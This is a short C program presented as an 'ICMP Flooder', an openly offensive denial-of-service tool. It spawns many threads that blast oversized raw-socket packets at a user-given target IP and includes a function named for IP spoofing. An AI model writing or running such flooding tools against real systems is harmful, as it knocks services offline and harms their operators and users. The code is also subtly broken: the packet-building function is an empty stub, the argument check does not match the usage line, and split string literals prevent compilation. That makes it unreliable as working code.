// ICMP Flooder in C

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <pthread.h>
#include <signal.h>

#define MAX_THREADS 10000
#define PACKET_SIZE 65507

// Global variables
volatile int running = 1;
volatile int packets_sent = 0;
volatile int bytes_sent = 0;

// Function to handle signals
void signal_handler(int sig) {
    running = 0;
}

// Function to create a raw socket
int create_raw_socket() {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }
    return sockfd;
}

// Function to set IP spoofing
void set_ip_spoofing(int sockfd) {
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(1);
    }
}

// Function to create an ICMP packet
void create_icmp_packet(char *packet, int packet_size) {
    // Packet structure: IP header + ICMP header + data
    // For simplicity, we'll just create a basic ICMP packet
    // In a real attack, you would need to handle IP and ICMP headers properly
}

// Attack thread function
void *attack_thread(void *arg) {
    struct sockaddr_in target = *((struct sockaddr_in *)arg);
    int sockfd = create_raw_socket();
    set_ip_spoofing(sockfd);

    char packet[PACKET_SIZE];
    create_icmp_packet(packet, PACKET_SIZE);

    while (running) {
        if (sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
            perror("sendto");
            break;
        }
        packets_sent++;
        bytes_sent += PACKET_SIZE;
    }

    close(sockfd);
    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <target_ip> <duration> <threads>
", argv[0]);
        return 1;
    }

    // Parse arguments
    const char *target_ip = argv[1];
    int duration = atoi(argv[2]);
    int num_threads = atoi(argv[3]);

    // Set up target address
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &target.sin_addr);

    // Set up signal handler
    signal(SIGINT, signal_handler);

    // Create threads
    pthread_t threads[MAX_THREADS];
    int i;
    for (i = 0; i < num_threads && i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, (void *)&target) != 0) {
            perror("pthread_create");
            break;
        }
    }

    // Wait for the specified duration
    sleep(duration);

    // Stop the attack
    running = 0;

    // Wait for threads to finish
    for (int j = 0; j < i; j++) {
        pthread_join(threads[j], NULL);
    }

    // Print statistics
    printf("Attack finished
");
    printf("Total packets sent: %d
", packets_sent);
    printf("Total bytes sent: %d
", bytes_sent);

    return 0;
}
